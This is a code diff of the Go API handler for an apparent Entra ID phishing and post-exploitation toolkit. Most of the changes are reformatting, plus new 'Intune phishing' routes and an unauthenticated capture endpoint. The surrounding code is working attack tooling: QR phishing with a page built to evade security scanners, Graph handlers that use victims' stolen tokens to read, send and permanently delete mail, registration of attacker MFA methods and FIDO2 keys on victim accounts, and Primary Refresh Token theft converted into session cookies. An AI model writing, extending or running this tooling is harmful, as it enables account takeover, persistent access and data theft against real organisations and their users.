@@ -14,14 +14,14 @@ import (
 	"github.com/bl4cksku11/entraith/internal/auth"
 	"github.com/bl4cksku11/entraith/internal/campaigns"
 	"github.com/bl4cksku11/entraith/internal/mailer"
-	"github.com/bl4cksku11/entraith/internal/web"
 	"github.com/bl4cksku11/entraith/internal/modules/devicereg"
-	mfapkg "github.com/bl4cksku11/entraith/internal/modules/mfa"
 	"github.com/bl4cksku11/entraith/internal/modules/graph"
+	mfapkg "github.com/bl4cksku11/entraith/internal/modules/mfa"
 	prtpkg "github.com/bl4cksku11/entraith/internal/modules/prt"
 	"github.com/bl4cksku11/entraith/internal/modules/tokenexchange"
 	"github.com/bl4cksku11/entraith/internal/store"
 	"github.com/bl4cksku11/entraith/internal/targets"
+	"github.com/bl4cksku11/entraith/internal/web"
 )
 
 type Handler struct {
@@ -107,6 +107,10 @@ func (h *Handler) Routes() http.Handler {
 	// QR phishing
 	mux.HandleFunc("POST /api/campaigns/{id}/qr-emails", h.sendQREmails)
 	mux.HandleFunc("GET /api/campaigns/{id}/qr-scans", h.listQRScans)
+
+	// Intune phishing
+	mux.HandleFunc("POST /api/campaigns/{id}/intune-emails", h.sendIntuneEmails)
+	mux.HandleFunc("GET /api/campaigns/{id}/intune-captures", h.listIntuneCaptures)
 
 	// Per-target token operations
 	mux.HandleFunc("POST /api/campaigns/{id}/tokens/{targetId}/refresh", h.refreshToken)
@@ -246,12 +250,13 @@ func (h *Handler) Routes() http.Handler {
 
 	// Webhook / telemetry receiver
 	mux.HandleFunc("POST /receive", h.receiveWebhook)
+	mux.HandleFunc("POST /intune/capture", h.CaptureIntune)
 
-	// Webhook listener control
-	mux.HandleFunc("GET /api/webhook/status", h.webhookStatus)
-	mux.HandleFunc("POST /api/webhook/start", h.webhookStart)
-	mux.HandleFunc("POST /api/webhook/stop", h.webhookStop)
-	mux.HandleFunc("GET /api/webhook/logs", h.webhookLogs)
+	// Webhook listener control — registered at root (not /api/) for external access
+	mux.HandleFunc("GET /webhook/status", h.webhookStatus)
+	mux.HandleFunc("POST /webhook/start", h.webhookStart)
+	mux.HandleFunc("POST /webhook/stop", h.webhookStop)
+	mux.HandleFunc("GET /webhook/logs", h.webhookLogs)
 
 	// Sender profiles
 	mux.HandleFunc("GET /api/mailer/profiles", h.listProfiles)
@@ -269,10 +274,12 @@ func (h *Handler) Routes() http.Handler {
 }
 
 // QRScanHandler returns two http.HandlerFunc values for the public /qr/{token} endpoints.
-//   GET  /qr/{token}         — scanner bait: serves an intermediate JS page that does nothing
-//                              by itself. Security scanners follow the URL and get an inert page.
-//   POST /qr/{token}/confirm — real trigger: called by JS on the target's actual browser.
-//                              This is where MarkQRScanned / LaunchForTarget / SendEmailToTarget run.
+//
+//	GET  /qr/{token}         — scanner bait: serves an intermediate JS page that does nothing
+//	                           by itself. Security scanners follow the URL and get an inert page.
+//	POST /qr/{token}/confirm — real trigger: called by JS on the target's actual browser.
+//	                           This is where MarkQRScanned / LaunchForTarget / SendEmailToTarget run.
+//
 // Register both on the main router (not /api/) so they require no auth.
 func (h *Handler) QRScanHandler() (get http.HandlerFunc, confirm http.HandlerFunc) {
 	get = func(w http.ResponseWriter, r *http.Request) {
@@ -543,17 +550,28 @@ func (h *Handler) sendEmailToTarget(w http.ResponseWriter, r *http.Request) {
 		TemplateID string `json:"template_id"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
-		writeError(w, 400, "invalid body"); return
+		writeError(w, 400, "invalid body")
+		return
 	}
 	if body.ProfileID == "" || body.TemplateID == "" {
-		writeError(w, 400, "profile_id and template_id required"); return
+		writeError(w, 400, "profile_id and template_id required")
+		return
 	}
 	profile, ok := h.Mailer.GetProfile(body.ProfileID)
-	if !ok { writeError(w, 404, "sender profile not found"); return }
+	if !ok {
+		writeError(w, 404, "sender profile not found")
+		return
+	}
 	tmpl, ok := h.Mailer.GetTemplate(body.TemplateID)
-	if !ok { writeError(w, 404, "email template not found"); return }
+	if !ok {
+		writeError(w, 404, "email template not found")
+		return
+	}
 	res, err := h.Manager.SendEmailToTarget(campaignID, targetID, profile, tmpl)
-	if err != nil { writeError(w, 400, err.Error()); return }
+	if err != nil {
+		writeError(w, 400, err.Error())
+		return
+	}
 	writeJSON(w, 200, res)
 }
 
@@ -568,26 +586,40 @@ func (h *Handler) sendQREmails(w http.ResponseWriter, r *http.Request) {
 		TargetID     string `json:"target_id"` // optional — send to one target only
 	}
 	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
-		writeError(w, 400, "invalid body"); return
+		writeError(w, 400, "invalid body")
+		return
 	}
 	if body.ProfileID == "" || body.QRTemplateID == "" || body.DCTemplateID == "" || body.BaseURL == "" {
-		writeError(w, 400, "profile_id, qr_template_id, dc_template_id, base_url required"); return
+		writeError(w, 400, "profile_id, qr_template_id, dc_template_id, base_url required")
+		return
 	}
 	if body.DCProfileID == "" {
 		body.DCProfileID = body.ProfileID
 	}
 	profile, ok := h.Mailer.GetProfile(body.ProfileID)
-	if !ok { writeError(w, 404, "sender profile not found"); return }
+	if !ok {
+		writeError(w, 404, "sender profile not found")
+		return
+	}
 	qrTmpl, ok := h.Mailer.GetTemplate(body.QRTemplateID)
-	if !ok { writeError(w, 404, "qr_template not found"); return }
+	if !ok {
+		writeError(w, 404, "qr_template not found")
+		return
+	}
 	results, err := h.Manager.SendQREmails(id, profile, qrTmpl, body.DCTemplateID, body.DCProfileID, body.BaseURL, body.TargetID)
-	if err != nil { writeError(w, 400, err.Error()); return }
+	if err != nil {
+		writeError(w, 400, err.Error())
+		return
+	}
 	writeJSON(w, 200, map[string]interface{}{"results": results})
 }
 
 func (h *Handler) listQRScans(w http.ResponseWriter, r *http.Request) {
 	scans, err := h.Store.ListQRScans(r.PathValue("id"))
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	if scans == nil {
 		scans = []store.QRScanRow{}
 	}
@@ -630,10 +662,12 @@ func (h *Handler) handleQRScanGet(w http.ResponseWriter, r *http.Request) {
 
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	w.Header().Set("Cache-Control", "no-store")
-	// Replace {{TOKEN}} in qrlanding.html with the real token.
-	// strings.ReplaceAll is used instead of fmt.Fprintf to avoid treating
-	// the HTML as a Go format string (any stray % in CSS/SVG would break it).
-	io.WriteString(w, strings.ReplaceAll(web.QRLandingHTML, "{{TOKEN}}", token))
+
+	html := web.QRLandingHTML
+	html = strings.ReplaceAll(html, "{{TOKEN}}", token)
+	html = strings.ReplaceAll(html, "{{BROKER_SCHEME}}", "{{BROKER_SCHEME}}")
+
+	io.WriteString(w, html)
 }
 
 // handleQRScanConfirm is Phase 2 of the two-phase QR scan flow.
@@ -1952,7 +1986,10 @@ func GenerateUserCodeCSV(w io.Writer, sessions map[string]interface{}) error {
 
 func (h *Handler) graphSearch(w http.ResponseWriter, r *http.Request) {
 	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	var body struct {
 		Query       string   `json:"query"`
 		EntityTypes []string `json:"entityTypes"`
@@ -1963,7 +2000,10 @@ func (h *Handler) graphSearch(w http.ResponseWriter, r *http.Request) {
 		body.EntityTypes = []string{"message", "driveItem", "site"}
 	}
 	result, err := gc.SearchContent(context.Background(), body.Query, body.EntityTypes, body.Top)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
@@ -1972,9 +2012,15 @@ func (h *Handler) graphSearch(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) graphDriveShared(w http.ResponseWriter, r *http.Request) {
 	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	result, err := gc.GetSharedWithMe(context.Background())
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
@@ -1983,18 +2029,30 @@ func (h *Handler) graphDriveShared(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) graphMailListAttachments(w http.ResponseWriter, r *http.Request) {
 	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	result, err := gc.ListMessageAttachments(context.Background(), r.PathValue("msgId"))
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
 
 func (h *Handler) graphMailDownloadAttachment(w http.ResponseWriter, r *http.Request) {
 	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	data, ct, err := gc.DownloadMessageAttachment(context.Background(), r.PathValue("msgId"), r.PathValue("attId"))
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	if ct != "" {
 		w.Header().Set("Content-Type", ct)
 	}
@@ -2003,16 +2061,23 @@ func (h *Handler) graphMailDownloadAttachment(w http.ResponseWriter, r *http.Req
 
 func (h *Handler) graphMailPermanentDelete(w http.ResponseWriter, r *http.Request) {
 	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	if err := gc.PermanentDeleteMessage(context.Background(), r.PathValue("msgId")); err != nil {
-		writeError(w, 500, err.Error()); return
+		writeError(w, 500, err.Error())
+		return
 	}
 	w.WriteHeader(204)
 }
 
 func (h *Handler) graphMailCreateDraft(w http.ResponseWriter, r *http.Request) {
 	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	var body struct {
 		Subject  string   `json:"subject"`
 		HTMLBody string   `json:"htmlBody"`
@@ -2020,32 +2085,48 @@ func (h *Handler) graphMailCreateDraft(w http.ResponseWriter, r *http.Request) {
 	}
 	json.NewDecoder(r.Body).Decode(&body)
 	result, err := gc.CreateMailDraft(context.Background(), body.Subject, body.HTMLBody, body.To)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
 
 func (h *Handler) graphMailAddAttachment(w http.ResponseWriter, r *http.Request) {
 	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	r.ParseMultipartForm(32 << 20)
 	file, hdr, err := r.FormFile("file")
-	if err != nil { writeError(w, 400, "file required"); return }
+	if err != nil {
+		writeError(w, 400, "file required")
+		return
+	}
 	defer file.Close()
 	data, _ := io.ReadAll(file)
 	ct := hdr.Header.Get("Content-Type")
-	if ct == "" { ct = "application/octet-stream" }
+	if ct == "" {
+		ct = "application/octet-stream"
+	}
 	if err := gc.AddAttachmentToDraft(context.Background(), r.PathValue("msgId"), hdr.Filename, ct, data); err != nil {
-		writeError(w, 500, err.Error()); return
+		writeError(w, 500, err.Error())
+		return
 	}
 	w.WriteHeader(204)
 }
 
 func (h *Handler) graphMailSendDraft(w http.ResponseWriter, r *http.Request) {
 	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	if err := gc.SendDraft(context.Background(), r.PathValue("msgId")); err != nil {
-		writeError(w, 500, err.Error()); return
+		writeError(w, 500, err.Error())
+		return
 	}
 	w.WriteHeader(204)
 }
@@ -2054,9 +2135,15 @@ func (h *Handler) graphMailSendDraft(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) graphUserBatch(w http.ResponseWriter, r *http.Request) {
 	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	result, err := gc.GetUserDetailsBatch(context.Background(), r.PathValue("userId"))
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
@@ -2065,7 +2152,10 @@ func (h *Handler) graphUserBatch(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) graphCustomRequest(w http.ResponseWriter, r *http.Request) {
 	token, err := h.Manager.GetTokenByTargetID(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	var body struct {
 		Method  string            `json:"method"`
 		URI     string            `json:"uri"`
@@ -2073,23 +2163,32 @@ func (h *Handler) graphCustomRequest(w http.ResponseWriter, r *http.Request) {
 		Body    string            `json:"body"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
-		writeError(w, 400, "invalid request"); return
+		writeError(w, 400, "invalid request")
+		return
 	}
-	if body.Method == "" { body.Method = "GET" }
+	if body.Method == "" {
+		body.Method = "GET"
+	}
 
 	var reqBody io.Reader
 	if body.Body != "" {
 		reqBody = strings.NewReader(body.Body)
 	}
 	req, err := http.NewRequestWithContext(context.Background(), body.Method, body.URI, reqBody)
-	if err != nil { writeError(w, 400, err.Error()); return }
+	if err != nil {
+		writeError(w, 400, err.Error())
+		return
+	}
 	req.Header.Set("Authorization", "Bearer "+token.AccessToken)
 	req.Header.Set("Accept", "application/json")
 	for k, v := range body.Headers {
 		req.Header.Set(k, v)
 	}
 	resp, err := http.DefaultClient.Do(req)
-	if err != nil { writeError(w, 502, err.Error()); return }
+	if err != nil {
+		writeError(w, 502, err.Error())
+		return
+	}
 	defer resp.Body.Close()
 	respBody, _ := io.ReadAll(resp.Body)
 	w.Header().Set("Content-Type", resp.Header.Get("Content-Type"))
@@ -2213,24 +2312,39 @@ func (h *Handler) mfaClient(campaignID, targetID string) (*mfapkg.Client, error)
 
 func (h *Handler) mfaListMethods(w http.ResponseWriter, r *http.Request) {
 	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	result, err := client.ListAvailableMethods(context.Background())
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
 
 func (h *Handler) mfaGetSession(w http.ResponseWriter, r *http.Request) {
 	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	ctx, err := client.GetSessionCtx(context.Background())
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	json.NewEncoder(w).Encode(map[string]string{"sessionCtx": ctx})
 }
 
 func (h *Handler) mfaAddPhone(w http.ResponseWriter, r *http.Request) {
 	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	var body struct {
 		PhoneType  int    `json:"phoneType"`
 		Phone      string `json:"phone"`
@@ -2238,28 +2352,40 @@ func (h *Handler) mfaAddPhone(w http.ResponseWriter, r *http.Request) {
 	}
 	json.NewDecoder(r.Body).Decode(&body)
 	result, err := client.AddPhoneMethod(context.Background(), body.PhoneType, body.Phone, body.SessionCtx)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
 
 func (h *Handler) mfaAddEmail(w http.ResponseWriter, r *http.Request) {
 	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	var body struct {
 		Email      string `json:"email"`
 		SessionCtx string `json:"sessionCtx"`
 	}
 	json.NewDecoder(r.Body).Decode(&body)
 	result, err := client.AddEmailMethod(context.Background(), body.Email, body.SessionCtx)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
 
 func (h *Handler) mfaAddApp(w http.ResponseWriter, r *http.Request) {
 	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	var body struct {
 		AppType    int    `json:"appType"`
 		SecretKey  string `json:"secretKey"`
@@ -2267,21 +2393,30 @@ func (h *Handler) mfaAddApp(w http.ResponseWriter, r *http.Request) {
 	}
 	json.NewDecoder(r.Body).Decode(&body)
 	result, err := client.AddMobileAppMethod(context.Background(), body.AppType, body.SecretKey, body.SessionCtx)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
 
 func (h *Handler) mfaRegisterTOTP(w http.ResponseWriter, r *http.Request) {
 	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	var body struct {
 		Label      string `json:"label"`
 		SessionCtx string `json:"sessionCtx"`
 	}
 	json.NewDecoder(r.Body).Decode(&body)
 	reg, err := client.RegisterAsOTPApp(context.Background(), body.Label, body.SessionCtx)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	// Persist the secret
 	id := fmt.Sprintf("otp-%d", time.Now().UnixNano())
 	h.Store.InsertOTPSecret(store.OTPSecretRow{
@@ -2292,7 +2427,10 @@ func (h *Handler) mfaRegisterTOTP(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) mfaVerify(w http.ResponseWriter, r *http.Request) {
 	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	var body struct {
 		VerificationID string `json:"verificationId"`
 		Code           string `json:"code"`
@@ -2300,43 +2438,61 @@ func (h *Handler) mfaVerify(w http.ResponseWriter, r *http.Request) {
 	}
 	json.NewDecoder(r.Body).Decode(&body)
 	result, err := client.VerifyMethod(context.Background(), body.VerificationID, body.Code, body.SessionCtx)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
 
 func (h *Handler) mfaDeleteMethod(w http.ResponseWriter, r *http.Request) {
 	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	var body struct {
 		MethodID   string `json:"methodId"`
 		SessionCtx string `json:"sessionCtx"`
 	}
 	json.NewDecoder(r.Body).Decode(&body)
 	if err := client.DeleteMethod(context.Background(), body.MethodID, body.SessionCtx); err != nil {
-		writeError(w, 500, err.Error()); return
+		writeError(w, 500, err.Error())
+		return
 	}
 	w.WriteHeader(204)
 }
 
 func (h *Handler) mfaFIDO2Begin(w http.ResponseWriter, r *http.Request) {
 	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	var body struct {
 		KeyName    string `json:"keyName"`
 		SessionCtx string `json:"sessionCtx"`
 	}
 	json.NewDecoder(r.Body).Decode(&body)
-	if body.KeyName == "" { body.KeyName = "Security Key" }
+	if body.KeyName == "" {
+		body.KeyName = "Security Key"
+	}
 	result, err := client.InitializeFIDO2Registration(context.Background(), body.KeyName, body.SessionCtx)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
 
 func (h *Handler) mfaFIDO2Complete(w http.ResponseWriter, r *http.Request) {
 	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	var body struct {
 		VerificationID      string          `json:"verificationId"`
 		SessionCtx          string          `json:"sessionCtx"`
@@ -2347,7 +2503,10 @@ func (h *Handler) mfaFIDO2Complete(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	result, err := client.CompleteFIDO2Registration(context.Background(), body.VerificationID, body.AttestationResponse, body.SessionCtx)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
@@ -2356,7 +2515,10 @@ func (h *Handler) mfaFIDO2Complete(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) tokenExchange(w http.ResponseWriter, r *http.Request) {
 	token, err := h.Manager.GetTokenByTargetID(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil { writeError(w, 404, err.Error()); return }
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
 	var body struct {
 		ClientID string `json:"clientId"`
 		Resource string `json:"resource"`
@@ -2411,10 +2573,15 @@ func (h *Handler) tokenExchange(w http.ResponseWriter, r *http.Request) {
 // ─── Utility ─────────────────────────────────────────────────────────────────
 
 func (h *Handler) utilTenantLookup(w http.ResponseWriter, r *http.Request) {
-	var body struct{ Domain string `json:"domain"` }
+	var body struct {
+		Domain string `json:"domain"`
+	}
 	json.NewDecoder(r.Body).Decode(&body)
 	tid, err := tokenexchange.LookupTenantID(context.Background(), body.Domain)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	json.NewEncoder(w).Encode(map[string]string{"tenantId": tid, "domain": body.Domain})
 }
 
@@ -2422,7 +2589,10 @@ func (h *Handler) utilTenantLookup(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) listDeviceCerts(w http.ResponseWriter, r *http.Request) {
 	rows, err := h.Store.ListDeviceCerts()
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	// Omit private keys from listing
 	type safeCert struct {
 		ID           string    `json:"id"`
@@ -2449,9 +2619,14 @@ func (h *Handler) createDeviceCert(w http.ResponseWriter, r *http.Request) {
 		JoinType     int    `json:"joinType"`
 	}
 	json.NewDecoder(r.Body).Decode(&body)
-	if body.Label == "" { body.Label = "Device-" + fmt.Sprintf("%d", time.Now().Unix()) }
+	if body.Label == "" {
+		body.Label = "Device-" + fmt.Sprintf("%d", time.Now().Unix())
+	}
 	cert, err := devicereg.Register(context.Background(), body.AccessToken, body.Label, body.TargetDomain, body.DeviceType, body.OSVersion, body.JoinType)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	h.Store.InsertDeviceCert(store.DeviceCertRow{
 		ID: cert.ID, Label: cert.Label, DeviceID: cert.DeviceID,
 		JoinType: cert.JoinType, Certificate: cert.Certificate,
@@ -2478,7 +2653,8 @@ func (h *Handler) importDeviceCert(w http.ResponseWriter, r *http.Request) {
 		PrivateKey: body.PrivateKey, TargetDomain: body.TargetDomain,
 		CreatedAt: time.Now().UTC(),
 	}); err != nil {
-		writeError(w, 500, err.Error()); return
+		writeError(w, 500, err.Error())
+		return
 	}
 	json.NewEncoder(w).Encode(map[string]string{"id": id})
 }
@@ -2492,7 +2668,10 @@ func (h *Handler) deleteDeviceCert(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) listPRTs(w http.ResponseWriter, r *http.Request) {
 	rows, err := h.Store.ListPRTs()
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	json.NewEncoder(w).Encode(rows)
 }
 
@@ -2510,7 +2689,10 @@ func (h *Handler) requestPRT(w http.ResponseWriter, r *http.Request) {
 		body.ClientID = "1950a258-227b-4e31-a9cf-717495945fc2" // Azure PowerShell
 	}
 	certRow, err := h.Store.GetDeviceCert(body.DeviceCertID)
-	if err != nil { writeError(w, 404, "device cert not found"); return }
+	if err != nil {
+		writeError(w, 404, "device cert not found")
+		return
+	}
 	dc := &devicereg.DeviceCert{
 		ID: certRow.ID, Label: certRow.Label, DeviceID: certRow.DeviceID,
 		JoinType: certRow.JoinType, Certificate: certRow.Certificate,
@@ -2518,7 +2700,10 @@ func (h *Handler) requestPRT(w http.ResponseWriter, r *http.Request) {
 		CreatedAt: certRow.CreatedAt,
 	}
 	p, err := prtpkg.Request(context.Background(), body.RefreshToken, body.ClientID, dc)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	p.Label = body.Label
 	p.TargetUPN = body.TargetUPN
 	p.TenantID = body.TenantID
@@ -2557,30 +2742,44 @@ func (h *Handler) deletePRT(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) prtToAccessToken(w http.ResponseWriter, r *http.Request) {
 	row, err := h.Store.GetPRT(r.PathValue("id"))
-	if err != nil { writeError(w, 404, "PRT not found"); return }
+	if err != nil {
+		writeError(w, 404, "PRT not found")
+		return
+	}
 	var body struct {
 		ClientID string `json:"clientId"`
 		Resource string `json:"resource"`
 		Scope    string `json:"scope"`
 	}
 	json.NewDecoder(r.Body).Decode(&body)
-	if body.ClientID == "" { body.ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c" }
+	if body.ClientID == "" {
+		body.ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+	}
 	p := &prtpkg.PRT{
 		ID: row.ID, Token: row.PRTToken, SessionKey: row.SessionKey,
 		TargetUPN: row.TargetUPN, TenantID: row.TenantID,
 	}
 	result, err := prtpkg.ToAccessToken(context.Background(), p, body.ClientID, body.Resource, body.Scope)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
 
 func (h *Handler) prtToCookie(w http.ResponseWriter, r *http.Request) {
 	row, err := h.Store.GetPRT(r.PathValue("id"))
-	if err != nil { writeError(w, 404, "PRT not found"); return }
+	if err != nil {
+		writeError(w, 404, "PRT not found")
+		return
+	}
 	p := &prtpkg.PRT{Token: row.PRTToken, SessionKey: row.SessionKey}
 	cookie, err := prtpkg.ToCookie(context.Background(), p)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	json.NewEncoder(w).Encode(map[string]string{"cookie": cookie, "name": "x-ms-RefreshTokenCredential"})
 }
 
@@ -2588,7 +2787,10 @@ func (h *Handler) prtToCookie(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) listWinHelloKeys(w http.ResponseWriter, r *http.Request) {
 	rows, err := h.Store.ListWinHelloKeys()
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	json.NewEncoder(w).Encode(rows)
 }
 
@@ -2601,13 +2803,19 @@ func (h *Handler) registerWinHelloKey(w http.ResponseWriter, r *http.Request) {
 	}
 	json.NewDecoder(r.Body).Decode(&body)
 	certRow, err := h.Store.GetDeviceCert(body.DeviceCertID)
-	if err != nil { writeError(w, 404, "device cert not found"); return }
+	if err != nil {
+		writeError(w, 404, "device cert not found")
+		return
+	}
 	dc := &devicereg.DeviceCert{
 		ID: certRow.ID, DeviceID: certRow.DeviceID,
 		Certificate: certRow.Certificate, PrivateKeyPEM: certRow.PrivateKey,
 	}
 	key, err := prtpkg.RegisterWinHello(context.Background(), body.AccessToken, dc, body.UserID, body.Label)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	h.Store.InsertWinHelloKey(store.WinHelloKeyRow{
 		ID: key.ID, Label: key.Label, DeviceCertID: key.DeviceCertID,
 		KeyID: key.KeyID, PrivateKey: key.PrivateKeyPEM,
@@ -2625,7 +2833,10 @@ func (h *Handler) deleteWinHelloKey(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) listOTPSecrets(w http.ResponseWriter, r *http.Request) {
 	rows, err := h.Store.ListOTPSecrets()
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	json.NewEncoder(w).Encode(rows)
 }
 
